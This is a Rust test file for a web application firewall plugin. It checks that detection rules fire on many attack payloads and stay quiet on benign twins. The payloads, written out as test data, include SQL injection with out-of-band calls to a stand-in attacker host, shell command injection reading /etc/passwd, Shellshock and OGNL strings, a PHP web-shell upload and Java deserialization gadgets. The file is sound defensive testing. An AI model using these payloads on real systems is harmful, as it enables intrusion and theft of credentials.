//! Built-in rule-pack coverage for the attack classes an enterprise WAF is
//! expected to recognise out of the box: blind / enumeration / error-based
//! SQL injection, cookie-borne injection, script-URL obfuscation, active HTML
//! elements, command execution without a classic `;cmd` chain, Shellshock,
//! OGNL, PHP and Node.js code injection, response splitting, restricted-file
//! probing, executable uploads, deserialization gadgets, and alternate
//! loopback spellings.
//!
//! Every case drives the real plugin hooks (`authorize` for request metadata,
//! the final request-body hook for bodies) so the assertions cover the
//! decode/normalization pipeline and target routing, not just the regex. Each
//! attack row has a benign twin chosen from the false-positive shape the
//! signature was designed around, so a later broadening shows up here.

use ferrum_edge::plugins::waf::Waf;
use ferrum_edge::plugins::{Plugin, PluginResult, RequestContext};
use ferrum_edge::policy_path::canonicalize_policy_path;
use serde_json::json;

fn ctx(method: &str, path: &str) -> RequestContext {
    RequestContext::new("203.0.113.10".into(), method.into(), path.into())
}

/// Monitor-mode pack at `paranoia_level`, with the scan budget pinned off so
/// rule semantics never depend on machine speed.
fn monitor_waf(paranoia_level: u8) -> Waf {
    Waf::new(&json!({
        "mode": "monitor",
        "paranoia_level": paranoia_level,
        "scan_budget_ms": 0
    }))
    .unwrap()
}

fn hits(ctx: &RequestContext) -> Vec<String> {
    ctx.metadata
        .get("waf.rule_hits")
        .map(|hits| hits.split(',').map(str::to_string).collect())
        .unwrap_or_default()
}

fn hit(ctx: &RequestContext, rule_id: &str) -> bool {
    hits(ctx).iter().any(|hit| hit == rule_id)
}

/// One inspected request surface.
enum Surface<'a> {
    /// Raw query string, exactly as it would follow `?` on the wire.
    Query(&'a str),
    Header(&'a str, &'a str),
    Cookie(&'a str),
    /// Canonical policy path.
    Path(&'a str),
    /// Request body with its declared content type.
    Body(&'a str, &'a [u8]),
}

async fn scan(plugin: &Waf, surface: &Surface<'_>) -> (PluginResult, RequestContext) {
    match surface {
        Surface::Query(raw) => {
            let mut request = ctx("GET", "/search");
            request.set_raw_query_string((*raw).to_string());
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Header(name, value) => {
            let mut request = ctx("GET", "/");
            request
                .headers
                .insert((*name).to_string(), (*value).to_string());
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Cookie(value) => {
            let mut request = ctx("GET", "/");
            request
                .headers
                .insert("cookie".to_string(), (*value).to_string());
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Path(path) => {
            let mut request = ctx("GET", path);
            let result = plugin.authorize(&mut request).await;
            (result, request)
        }
        Surface::Body(content_type, body) => {
            let mut request = ctx("POST", "/submit");
            request
                .headers
                .insert("content-type".to_string(), (*content_type).to_string());
            let headers = request.headers.clone();
            let result = plugin
                .on_final_request_body_with_context(&mut request, &headers, body)
                .await;
            (result, request)
        }
    }
}

fn describe(surface: &Surface<'_>) -> String {
    match surface {
        Surface::Query(raw) => format!("query {raw:?}"),
        Surface::Header(name, value) => format!("header {name}: {value:?}"),
        Surface::Cookie(value) => format!("cookie {value:?}"),
        Surface::Path(path) => format!("path {path:?}"),
        Surface::Body(content_type, body) => {
            format!("{content_type} body {:?}", String::from_utf8_lossy(body))
        }
    }
}

async fn assert_detected(plugin: &Waf, rule_id: &str, surface: Surface<'_>) {
    let (_, request) = scan(plugin, &surface).await;
    assert!(
        hit(&request, rule_id),
        "{rule_id} must fire on {}; hits={:?}",
        describe(&surface),
        hits(&request)
    );
}

async fn assert_clean(plugin: &Waf, rule_id: &str, surface: Surface<'_>) {
    let (_, request) = scan(plugin, &surface).await;
    assert!(
        !hit(&request, rule_id),
        "{rule_id} must not fire on {}; hits={:?}",
        describe(&surface),
        hits(&request)
    );
}

const JSON: &str = "application/json";
const TEXT: &str = "text/plain";
const FORM: &str = "application/x-www-form-urlencoded";

#[tokio::test]
async fn blind_time_delay_sqli_is_detected_in_query_and_body() {
    let plugin = monitor_waf(1);
    for query in [
        "id=1%20AND%20SLEEP(5)",
        "id=sleep(5)",
        "id=1;SELECT%20pg_sleep(10)",
        "id=(SELECT(SLEEP(5)))",
        "id=1'/**/AND/**/SLEEP(5)--%20",
        "id=1%20or%20benchmark(5000000,md5(1))",
        "id=1';WAITFOR%20DELAY%20'0:0:5'--",
        "id=x'||dbms_pipe.receive_message('a',5)||'",
    ] {
        assert_detected(&plugin, "FE-SQLI-006", Surface::Query(query)).await;
    }
    assert_clean(&plugin, "FE-SQLI-006", Surface::Query("q=sleep%20tips")).await;

    // Level-1 body coverage requires SQL context around the delay call.
    for body in [
        br#"{"id":"1 AND SLEEP(5)"}"#.as_slice(),
        br#"{"id":"1' AND (SELECT(SLEEP(5)))-- "}"#,
        br#"{"id":"1 AND IF(1=1,SLEEP(5),0)"}"#,
        br#"{"id":"x'+sleep(5)+'"}"#,
        br#"{"id":"1 ORDER BY SLEEP(5)"}"#,
        br#"{"q":"x'||pg_sleep(5)||'"}"#,
        br#"{"id":"1) OR BENCHMARK(5000000,MD5(1))#"}"#,
        br#"{"id":"1';WAITFOR DELAY '0:0:5'--"}"#,
    ] {
        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-010-B",
        Surface::Body(FORM, b"id=1+AND+SLEEP%285%29"),
    )
    .await;

    // Application code calls `sleep` as a method, after `await`, after a
    // statement separator, in an assignment, or in parentheses; `benchmark`
    // is an ordinary function name. None of these is SQL context.
    let code_bodies = [
        br#"{"code":"import time\ntime.sleep(1)"}"#.as_slice(),
        br#"{"code":"await sleep(100)"}"#,
        br#"{"note":"I need sleep; benchmark results are in"}"#,
        br#"{"code":"foo();\n  sleep(1);"}"#,
        br#"{"code":"x = sleep(5)"}"#,
        br#"{"code":"if ready: (sleep(1))"}"#,
        br#"{"code":"benchmark(1000, fn)"}"#,
    ];
    for body in code_bodies {
        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
        assert_clean(&plugin, "FE-SQLI-006-B", Surface::Body(JSON, body)).await;
    }
    assert_clean(
        &plugin,
        "FE-SQLI-010-B",
        Surface::Body(TEXT, b"void run() {\n  foo();\n  sleep(1);\n}\n"),
    )
    .await;

    // The exact query-pattern body mirror is level 2, where code shapes are an
    // accepted cost.
    let level_two = monitor_waf(2);
    for body in [
        br#"{"id":"1;sleep(5)"}"#.as_slice(),
        br#"{"code":"x = sleep(5)"}"#,
    ] {
        assert_detected(&level_two, "FE-SQLI-006-B", Surface::Body(JSON, body)).await;
    }
}

#[tokio::test]
async fn catalog_enumeration_and_error_based_sqli_are_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "q=1%20union%20select%20table_name%20from%20information_schema.tables",
        "q=select%20sql%20from%20sqlite_master",
        "q=select%20name%20from%20sysobjects",
        "q=select%20*%20from%20pg_catalog.pg_tables",
    ] {
        assert_detected(&plugin, "FE-SQLI-007", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-007-B",
        Surface::Body(JSON, br#"{"q":"select usename from pg_shadow"}"#),
    )
    .await;
    // Ordinary keys that merely resemble catalog objects.
    assert_clean(
        &plugin,
        "FE-SQLI-007-B",
        Surface::Body(
            JSON,
            br#"{"all_users":[],"user_tables":1,"mysql.user":"app"}"#,
        ),
    )
    .await;

    for query in [
        "q=1%20and%20extractvalue(1,concat(0x7e,version()))",
        "q=updatexml(null,concat(0x7e,user()),null)",
        "q=union%20select%20load_file('/etc/passwd')",
        "q=1%20into%20outfile%20'/var/www/x.php'",
        "q=exec%20master..xp_cmdshell%20'whoami'",
    ] {
        assert_detected(&plugin, "FE-SQLI-008", Surface::Query(query)).await;
    }
    for body in [
        b"x' AND utl_http.request('http://attacker/')='1".as_slice(),
        b"1 union select load_file(0x2f6574632f706173737764)",
        b"1 union select load_file(concat('\\\\',version(),'.attacker.example\\a'))",
    ] {
        assert_detected(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
    assert_clean(
        &plugin,
        "FE-SQLI-008",
        Surface::Query("q=update%20xml%20outfile%20docs"),
    )
    .await;
    // `load_file` as an ordinary function or method name.
    for body in [
        b"def load_file(path):\n    return open(path).read()\n".as_slice(),
        b"data = load_file(filename)",
        b"cfg = loader.load_file('/etc/app.conf')",
    ] {
        assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
    }
}

#[tokio::test]
async fn quoted_string_tautology_is_detected_including_unspaced_form() {
    let plugin = monitor_waf(1);
    for query in [
        "user=admin'%20or%20'1'='1",
        "user='or'1'='1",
        "user=x'%20||%20'a'%20like%20'a",
        "user='/**/or/**/'x'='x",
    ] {
        assert_detected(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-SQLI-009-B",
        Surface::Body(JSON, br#"{"user":"admin' or 'a'='a"}"#),
    )
    .await;

    assert_clean(
        &plugin,
        "FE-SQLI-009",
        Surface::Query("q=rock%20'n'%20roll%20or%20'jazz'"),
    )
    .await;
    assert_clean(
        &plugin,
        "FE-SQLI-009-B",
        Surface::Body(JSON, br#"{"op":"or","expr":"a=b"}"#),
    )
    .await;
}

#[tokio::test]
async fn cookie_values_are_an_injection_surface() {
    let plugin = monitor_waf(1);
    assert_detected(
        &plugin,
        "FE-SQLI-001-C",
        Surface::Cookie("theme=dark; id=1 UNION SELECT password FROM users"),
    )
    .await;
    assert_detected(&plugin, "FE-SQLI-002-C", Surface::Cookie("uid=1 or 1=1")).await;
    assert_detected(
        &plugin,
        "FE-XSS-001-C",
        Surface::Cookie("pref=<script>alert(1)</script>"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-XSS-002-C",
        Surface::Cookie("return=javascript:alert(1)"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-PATHTRAV-001-C",
        Surface::Cookie("lang=../../../../etc/passwd"),
    )
    .await;

    // `FE-SQLI-003-C` has no detection case here: the Cookie header is split
    // on `;` before matching, so the stacked-statement `;` can only reach it
    // percent-encoded (`id=1%3BDROP%20TABLE%20users`) once cookie values are
    // also scanned decoded. That detection case belongs with the change that
    // adds decoded cookie views.

    // Real-world cookie jars: analytics ids, JWT sessions, locale.
    for rule in [
        "FE-SQLI-001-C",
        "FE-SQLI-002-C",
        "FE-SQLI-003-C",
        "FE-XSS-001-C",
        "FE-XSS-002-C",
        "FE-PATHTRAV-001-C",
    ] {
        assert_clean(
            &plugin,
            rule,
            Surface::Cookie(
                "_ga=GA1.2.1234567890.1700000000; session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln; locale=en-US",
            ),
        )
        .await;
    }
}

#[tokio::test]
async fn script_url_scheme_survives_tab_and_newline_obfuscation() {
    let plugin = monitor_waf(1);
    // Browsers delete ASCII tab/LF/CR inside a URL before reading the scheme.
    for query in [
        "next=javascript:alert(1)",
        "next=java%09script:alert(1)",
        "next=jav%0Aascript:alert(1)",
        "next=java%26%23x09;script:alert(1)",
        "next=vbscript:msgbox(1)",
    ] {
        assert_detected(&plugin, "FE-XSS-002", Surface::Query(query)).await;
    }
    assert_detected(
        &plugin,
        "FE-XSS-002-B",
        Surface::Body(JSON, br#"{"url":"java&#x09;script:alert(1)"}"#),
    )
    .await;
    // Prose with a real space is not a URL scheme.
    assert_clean(
        &plugin,
        "FE-XSS-002",
        Surface::Query("title=java%20script:%20a%20primer"),
    )
    .await;
}

#[tokio::test]
async fn active_content_elements_are_detected_in_query_and_gated_in_body() {
    let level_one = monitor_waf(1);
    for query in [
        "q=%3Csvg/onload=alert(1)%3E",
        "q=%3Cbase%20href=//evil.example/%3E",
        "q=%3Cmeta%20http-equiv=refresh%20content=0;url=//evil%3E",
        "q=%3Ciframe%20src=//evil%3E",
    ] {
        assert_detected(&level_one, "FE-XSS-006-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &level_one,
        "FE-XSS-006-Q",
        Surface::Query("q=a%20%3C%20svg"),
    )
    .await;
    assert_clean(
        &level_one,
        "FE-XSS-006-Q",
        Surface::Query("q=%3Cmetadata%3E"),
    )
    .await;

    // Rich-text bodies legitimately carry markup, so the body mirror is L2.
    let body: &[u8] = br#"{"html":"<svg viewBox=\"0 0 1 1\"></svg>"}"#;
    assert_clean(&level_one, "FE-XSS-006-B", Surface::Body(JSON, body)).await;
    assert_detected(&monitor_waf(2), "FE-XSS-006-B", Surface::Body(JSON, body)).await;
}

#[tokio::test]
async fn command_execution_without_a_classic_chain_is_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "host=%60id%60",
        "host=$(whoami)",
        "host=x$(cat%20/etc/passwd)",
        "host=127.0.0.1%0Awhoami",
        "host=127.0.0.1%0D%0Aid",
        "host=127.0.0.1%0Acat%20/etc/passwd",
        "host=127.0.0.1%0Abash%20-i",
        "host=127.0.0.1%0AIPCONFIG",
        "host=a|uname%20-a",
        "host=a%26%26ifconfig",
        "host=a%26%26uname",
        "host=a;powershell%20-nop",
        "host=a|busybox%20%3E/tmp/x",
        "file=cat${IFS}/etc/passwd",
    ] {
        assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }
    // Delimited lists, multi-line prose, and ordinary words stay clean.
    for query in [
        "tags=linux;bash;php",
        "q=dogs|cat",
        "q=a;b;c",
        "company=R%26D",
        "price=$(USD)",
        "q=whoami",
        "tags=windows;powershell",
        "tags=windows;powershell;linux",
        "skills=bash|pwsh",
        "tags=linux;busybox",
        "fields=id|uname",
        "note=Order%0AID:%2012345",
        "note=Pets%0ACat%20food",
        "note=first%0Acat%20food%0Asecond",
        "note=intro%0APython%20is%20fun",
    ] {
        assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
    }

    for query in [
        "cmd=/bin/bash%20-i",
        "cmd=cmd.exe%20/c%20dir",
        "cmd=powershell%20-enc%20SQBFAFgA",
        "cmd=sh%20-c%20id",
        "cmd=python3%20-c%20'import%20os'",
    ] {
        assert_detected(&plugin, "FE-CMD-005-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &plugin,
        "FE-CMD-005-Q",
        Surface::Query("q=bash%20scripting"),
    )
    .await;

    // Deployment and CI APIs carry scripts, so the body mirror is L2.
    let script: &[u8] = br#"{"entrypoint":"/bin/sh -c ./start.sh"}"#;
    assert_clean(&plugin, "FE-CMD-005-B", Surface::Body(JSON, script)).await;
    assert_detected(&monitor_waf(2), "FE-CMD-005-B", Surface::Body(JSON, script)).await;
}

#[tokio::test]
async fn shellshock_is_detected_in_headers_and_the_cgi_query_string() {
    let plugin = monitor_waf(1);
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-H",
        Surface::Header("user-agent", "() { :; }; /bin/bash -c 'id'"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-H",
        Surface::Header("referer", "(){ :;}; echo vulnerable"),
    )
    .await;
    // `QUERY_STRING` begins with the first pair's key.
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-Q",
        Surface::Query("()%20%7B%20:;%20%7D;%20/bin/id"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-SHELLSHOCK-001-QV",
        Surface::Query("x=()%20%7B%20:;%20%7D;%20/bin/id"),
    )
    .await;
    // Ordinary JavaScript never *starts* a header value with `() {`.
    assert_clean(
        &plugin,
        "FE-SHELLSHOCK-001-H",
        Surface::Header("x-snippet", "function() { return 1; }"),
    )
    .await;
    // Query keys and values that contain `() {` later, or `()` with no body.
    let benign_query = "()=1&cb=function()%20%7B%20return%201;%20%7D&sig=f()";
    for rule in ["FE-SHELLSHOCK-001-Q", "FE-SHELLSHOCK-001-QV"] {
        assert_clean(&plugin, rule, Surface::Query(benign_query)).await;
    }
}

#[tokio::test]
async fn ognl_injection_is_detected_including_the_content_type_vector() {
    let plugin = monitor_waf(1);
    // CVE-2017-5638 (S2-045) delivered its expression in `Content-Type`.
    assert_detected(
        &plugin,
        "FE-OGNL-001-H",
        Surface::Header(
            "content-type",
            "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):x)}",
        ),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-OGNL-001-Q",
        Surface::Query("x=%24%7B%40java.lang.Runtime%40getRuntime().exec('id')%7D"),
    )
    .await;
    assert_detected(
        &plugin,
        "FE-OGNL-001-B",
        Surface::Body(
            FORM,
            b"x=%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue",
        ),
    )
    .await;
    assert_clean(
        &plugin,
        "FE-OGNL-001-Q",
        Surface::Query("email=dev@java.lang.example.org&t=%25%7Bname%7D"),
    )
    .await;
    // A real multipart `Content-Type`, and a body with a CSS id selector, a
    // `%{name}` format placeholder, and a `java.lang` email address.
    assert_clean(
        &plugin,
        "FE-OGNL-001-H",
        Surface::Header("content-type", "multipart/form-data; boundary=----x1"),
    )
    .await;
    assert_clean(
        &plugin,
        "FE-OGNL-001-B",
        Surface::Body(
            JSON,
            br##"{"selector":"#context-menu","template":"%{name}","email":"dev@java.lang.example.org"}"##,
        ),
    )
    .await;
}

#[tokio::test]
async fn php_and_node_code_injection_are_detected() {
    let level_one = monitor_waf(1);
    for query in [
        "x=%3C?php%20system('id');%20?%3E",
        "x=eval($_POST%5B'c'%5D)",
        "x=assert(base64_decode('cGhwaW5mbygpOw=='))",
        "x=system('id')",
    ] {
        assert_detected(&level_one, "FE-PHP-001-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &level_one,
        "FE-PHP-001-Q",
        Surface::Query("x=system%20design"),
    )
    .await;
    assert_clean(
        &level_one,
        "FE-PHP-001-Q",
        Surface::Query("x=%3C?xml%20version=%221.0%22?%3E"),
    )
    .await;

    for query in [
        "page=php://input",
        "page=phar://uploads/avatar.jpg",
        "page=zip://shell.zip%23x.php",
        "page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B",
    ] {
        assert_detected(&level_one, "FE-PHP-002-Q", Surface::Query(query)).await;
    }
    assert_clean(&level_one, "FE-PHP-002-Q", Surface::Query("zip=90210")).await;

    for query in [
        "x=require('child_process').exec('id')",
        "x=process.mainModule.require('fs')",
        "x=this.constructor.constructor('return%20process')()",
    ] {
        assert_detected(&level_one, "FE-NODE-001-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &level_one,
        "FE-NODE-001-Q",
        Surface::Query("x=require('lodash')&y=process.env"),
    )
    .await;

    // Code-hosting and notebook APIs carry source, so body mirrors are L2.
    // PHP reads its own request body through `php://input`.
    let php_source: &[u8] = br#"{"source":"<?php echo 'hi'; ?>"}"#;
    let node_source: &[u8] = br#"{"source":"const cp = require('child_process');"}"#;
    let php_wrapper_source: &[u8] = br#"{"source":"$raw = file_get_contents('php://input'); $t = fopen('php://temp', 'r+');"}"#;
    let phar_value: &[u8] = br#"{"template":"phar://uploads/x.jpg/y"}"#;
    assert_clean(&level_one, "FE-PHP-001-B", Surface::Body(JSON, php_source)).await;
    for body in [php_wrapper_source, phar_value] {
        assert_clean(&level_one, "FE-PHP-002-B", Surface::Body(JSON, body)).await;
    }
    assert_clean(
        &level_one,
        "FE-NODE-001-B",
        Surface::Body(JSON, node_source),
    )
    .await;
    let level_two = monitor_waf(2);
    assert_detected(&level_two, "FE-PHP-001-B", Surface::Body(JSON, php_source)).await;
    for body in [php_wrapper_source, phar_value] {
        assert_detected(&level_two, "FE-PHP-002-B", Surface::Body(JSON, body)).await;
    }
    assert_detected(
        &level_two,
        "FE-NODE-001-B",
        Surface::Body(JSON, node_source),
    )
    .await;
}

#[tokio::test]
async fn crlf_header_injection_through_query_values_is_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "next=/home%0D%0ASet-Cookie:%20session=attacker",
        "next=/home%0ALocation:%20https://evil.example/",
        "next=x%0D%0A%0D%0AHTTP/1.1%20200%20OK",
        // A double-encoded CRLF is reduced by the layered query decode.
        "next=/home%250D%250ASet-Cookie:%20a=b",
    ] {
        assert_detected(&plugin, "FE-CRLF-001", Surface::Query(query)).await;
    }
    assert_clean(
        &plugin,
        "FE-CRLF-001",
        Surface::Query("note=line%20one%0Aline%20two"),
    )
    .await;
}

#[tokio::test]
async fn restricted_file_probes_are_detected_on_the_canonical_path() {
    let plugin = monitor_waf(1);
    for path in [
        "/.git/config",
        "/.git",
        "/app/.env",
        "/.env.production",
        "/.htaccess",
        "/.aws/credentials",
        "/home/deploy/.ssh/id_rsa",
        "/.npmrc",
        "/web.config",
        "/wp-config.php.bak",
        "/wp-config.php~",
        "/.wp-config.php.swp",
        "/.DS_Store",
        "/.svn/entries",
    ] {
        assert_detected(&plugin, "FE-RESTRICTED-001", Surface::Path(path)).await;
    }
    for path in [
        "/.well-known/acme-challenge/token",
        "/.github/workflows/ci.yml",
        "/.gitignore",
        "/api/env",
        "/docs/git/config",
        "/.envelope",
        "/wp-config-sample.php",
    ] {
        assert_clean(&plugin, "FE-RESTRICTED-001", Surface::Path(path)).await;
    }

    // The WAF reads the canonical policy path, which has already decoded an
    // encoded `.`; the literal `/.git/config` spelling is not required.
    let encoded = canonicalize_policy_path("/%2egit/config").unwrap();
    assert_eq!(encoded, "/.git/config");
    assert_detected(&plugin, "FE-RESTRICTED-001", Surface::Path(&encoded)).await;
    let benign = canonicalize_policy_path("/docs/%2egithub/README").unwrap();
    assert_clean(&plugin, "FE-RESTRICTED-001", Surface::Path(&benign)).await;

    // Backup/dump artifacts are legitimate downloads on some sites: L2.
    assert_clean(
        &plugin,
        "FE-RESTRICTED-002",
        Surface::Path("/index.php.bak"),
    )
    .await;
    let level_two = monitor_waf(2);
    for path in ["/index.php.bak", "/db.sql", "/index.php~", "/data.sqlite3"] {
        assert_detected(&level_two, "FE-RESTRICTED-002", Surface::Path(path)).await;
    }
    assert_clean(
        &level_two,
        "FE-RESTRICTED-002",
        Surface::Path("/~user/home"),
    )
    .await;
}

#[tokio::test]
async fn executable_upload_filename_requires_multipart_inspection() {
    let body: &[u8] = b"--b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET['c']); ?>\r\n--b--\r\n";
    let multipart = "multipart/form-data; boundary=b";

    // Multipart bodies are outside the default scan scope.
    assert_clean(
        &monitor_waf(1),
        "FE-UPLOAD-001",
        Surface::Body(multipart, body),
    )
    .await;

    let inspecting = Waf::new(&json!({
        "mode": "monitor",
        "inspect_multipart": true,
        "scan_budget_ms": 0
    }))
    .unwrap();
    assert_detected(&inspecting, "FE-UPLOAD-001", Surface::Body(multipart, body)).await;
    for filename in [
        "filename=\"x.PhP5\"",
        "filename=shell.jsp",
        "filename*=UTF-8''shell.aspx",
        "filename=\".htaccess\"",
        // Windows/IIS strip trailing dots and spaces and read `::$DATA` as the
        // default stream; a NUL truncates the name in C-backed handlers.
        "filename=\"shell.php.\"",
        "filename=\"shell.php \"",
        "filename=\"shell.php::$DATA\"",
        "filename=\"shell.php%00.jpg\"",
        "filename=\"shell.php\0.jpg\"",
    ] {
        let part = format!(
            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
        );
        assert_detected(
            &inspecting,
            "FE-UPLOAD-001",
            Surface::Body(multipart, part.as_bytes()),
        )
        .await;
    }
    for filename in [
        "filename=\"report.pdf\"",
        "filename=\"notes.phpinfo.txt\"",
        "filename=\"a.aspirin.png\"",
    ] {
        let part = format!(
            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
        );
        assert_clean(
            &inspecting,
            "FE-UPLOAD-001",
            Surface::Body(multipart, part.as_bytes()),
        )
        .await;
    }

    // A form or JSON field that names a script is not an upload: only a
    // multipart `Content-Disposition` parameter is.
    assert_clean(
        &inspecting,
        "FE-UPLOAD-001",
        Surface::Body(FORM, b"title=home&filename=index.php"),
    )
    .await;
    assert_clean(
        &inspecting,
        "FE-UPLOAD-001",
        Surface::Body(
            JSON,
            br#"{"filename":"index.php","path":"/var/www/shell.php"}"#,
        ),
    )
    .await;
}

#[tokio::test]
async fn deserialization_gadgets_are_detected_without_flagging_json_ld() {
    let plugin = monitor_waf(1);
    assert_detected(
        &plugin,
        "FE-DESER-001",
        Surface::Body(TEXT, b"payload=aced0005737200116a617661"),
    )
    .await;
    // Hex ids that merely contain the magic, or carry no stream after it.
    for body in [
        br#"{"commit":"9aced0005c0ffee12"}"#.as_slice(),
        br#"{"color":"aced0005"}"#,
    ] {
        assert_clean(&plugin, "FE-DESER-001", Surface::Body(JSON, body)).await;
    }
    for body in [
        b"!!python/object/apply:os.system ['id']".as_slice(),
        b"x: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[]]]",
        b"--- !ruby/object:Gem::Installer\ni: x",
    ] {
        assert_detected(&plugin, "FE-DESER-004", Surface::Body(TEXT, body)).await;
    }
    for body in [
        br#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}"#.as_slice(),
        br#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#,
        br#"{"@class":"org.springframework.context.support.FileSystemXmlApplicationContext"}"#,
        // Fastjson autoType bypasses: JVM descriptor and array spellings.
        br#"{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://x/a"}"#,
        br#"{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://x/a"}"#,
        br#"{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://x/a"}]}"#,
        // Jackson `WRAPPER_ARRAY` default typing carries no discriminator key.
        br#"["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://x/a"}]"#,
    ] {
        assert_detected(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }
    for body in [
        br#"{"@context":"https://schema.org","@type":"Product","name":"Widget"}"#.as_slice(),
        br#"{"$type":"MyApp.Models.Order, MyApp"}"#,
        br#"{"@class":"com.example.Invoice"}"#,
        br#"{"@type":"Lunch"}"#,
        br#"["com.example.Order",{"id":1}]"#,
        br#"{"deps":[["org.apache.commons:commons-lang3",{"scope":"test"}]]}"#,
    ] {
        assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }
    assert_clean(
        &plugin,
        "FE-DESER-004",
        Surface::Body(TEXT, b"key: !!str value\nblob: !!binary aGk="),
    )
    .await;
}

#[tokio::test]
async fn ssrf_covers_additional_metadata_endpoints_and_alternate_loopback_forms() {
    let level_one = monitor_waf(1);
    for query in [
        "u=http://169.254.170.2/v2/credentials",
        "u=http://%5Bfd00:ec2::254%5D/latest/meta-data/",
        "u=http://100.100.100.200/latest/meta-data/",
    ] {
        assert_detected(&level_one, "FE-SSRF-001-Q", Surface::Query(query)).await;
    }

    // `localhost` and alternate numeric spellings are L2.
    let loopback_forms = [
        "u=http://localhost/admin",
        "u=http://0/",
        "u=http://0.0.0.0:8080/",
        "u=http://2130706433/",
        "u=http://0x7f000001/",
        "u=http://017700000001/",
        "u=http://0x7f.1/",
        "u=http://%5B::1%5D/",
        "u=http://%5B::ffff:127.0.0.1%5D/",
        "u=gopher://localhost:6379/_INFO",
        "u=http://127.1/",
        "u=http://127.0.1:8080/",
        "u=http://localhost./admin",
    ];
    for query in loopback_forms {
        assert_clean(&level_one, "FE-SSRF-003-Q", Surface::Query(query)).await;
    }
    let level_two = monitor_waf(2);
    for query in loopback_forms {
        assert_detected(&level_two, "FE-SSRF-003-Q", Surface::Query(query)).await;
    }
    for query in [
        "u=http://localhost.example.com/",
        "u=https://example.com/",
        "u=http://123.45.67.89/",
        "u=http://0day.example/",
        "u=http://127.1.example.com/",
    ] {
        assert_clean(&level_two, "FE-SSRF-003-Q", Surface::Query(query)).await;
    }
    assert_detected(
        &level_two,
        "FE-SSRF-003-B",
        Surface::Body(JSON, br#"{"webhook":"http://[::1]:9000/hook"}"#),
    )
    .await;
}

/// The recommended starting posture enforces the new level-1 signatures
/// through bulk `default_rule_action: enforce`, and keeps level-2 mirrors out.
#[tokio::test]
async fn recommended_posture_enforces_new_level_one_signatures() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "paranoia_level": 1,
        "scan_budget_ms": 0
    }))
    .unwrap();

    for surface in [
        Surface::Query("id=1%20AND%20SLEEP(5)"),
        Surface::Query("host=$(whoami)"),
        Surface::Cookie("id=1 UNION SELECT password FROM users"),
        Surface::Header("user-agent", "() { :; }; /bin/id"),
        Surface::Path("/.git/config"),
        Surface::Body(JSON, br#"{"@type":"com.sun.rowset.JdbcRowSetImpl"}"#),
    ] {
        let (result, request) = scan(&plugin, &surface).await;
        assert!(
            matches!(
                result,
                PluginResult::Reject {
                    status_code: 403,
                    ..
                }
            ),
            "{} must be rejected at the recommended posture; hits={:?}",
            describe(&surface),
            hits(&request)
        );
    }

    for surface in [
        Surface::Query("q=shoes%20and%20socks&page=2"),
        Surface::Cookie("_ga=GA1.2.1234567890.1700000000; locale=en-US"),
        Surface::Path("/.well-known/openid-configuration"),
        Surface::Body(
            JSON,
            br#"{"@context":"https://schema.org","@type":"Product","code":"time.sleep(1)","html":"<svg></svg>"}"#,
        ),
        // Code-carrying bodies (LLM prompts, gists, CI APIs) at level 1.
        Surface::Body(
            JSON,
            br#"{"src":"def load_file(path):\n    raw = file_get_contents('php://input')\n    x = sleep(5)\n    benchmark(1000, fn)\n    foo();\n    sleep(1);"}"#,
        ),
    ] {
        let (result, request) = scan(&plugin, &surface).await;
        assert!(
            matches!(result, PluginResult::Continue),
            "{} must pass at the recommended posture; hits={:?}",
            describe(&surface),
            hits(&request)
        );
    }
}
